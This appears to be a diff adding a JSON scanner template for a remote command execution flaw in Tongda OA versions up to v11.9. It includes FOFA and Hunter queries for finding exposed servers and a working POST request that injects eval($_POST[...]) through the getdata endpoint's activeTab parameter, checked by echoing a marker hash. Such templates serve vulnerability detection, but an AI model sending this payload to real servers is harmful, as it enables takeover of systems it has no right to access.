@@ -1,0 +1,35 @@
+{
+  "product": "通达OA",
+  "vul_name": "通达OA v11.9 getdata 任意命令执行",
+  "type": "代码执行",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "通达OA v11.9 getdata接口存在任意命令执行漏洞，攻击者通过漏洞可以执行服务器任意命令控制服务器权限。",
+  "version": "通达OA <= v11.9",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"TDXK-通达OA\"",
+    "Hunter": "app.name=\"通达 OA\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/qq_41904294/article/details/129689610",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval($_POST[1443]))%3B/*&id=19&module=Carouselimage",
+      "data": "1443=echo \"95cc64dd2825f9df13ec4ad683ecf339\";"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "95cc64dd2825f9df13ec4ad683ecf339"
+        }
+      ]
+    }
+  }
+}
